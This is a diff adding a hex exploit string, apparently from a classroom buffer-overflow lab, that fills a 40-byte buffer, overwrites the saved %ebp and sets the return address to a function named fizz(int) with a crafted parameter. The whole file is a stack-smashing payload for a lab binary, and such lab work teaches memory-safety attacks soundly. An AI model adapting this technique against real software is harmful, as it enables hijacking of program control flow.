@@ -1,0 +1,15 @@
+/* 40 Byte Buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* buffer */
+00 00 00 00 /* old %ebp */
+98 8b 04 08 /* return address: fizz(int) memory address */
+00 00 00 00 /* return address: fizz(int) return address */
+ae 2e 71 47 /* parameter: fizz(int) parameter */
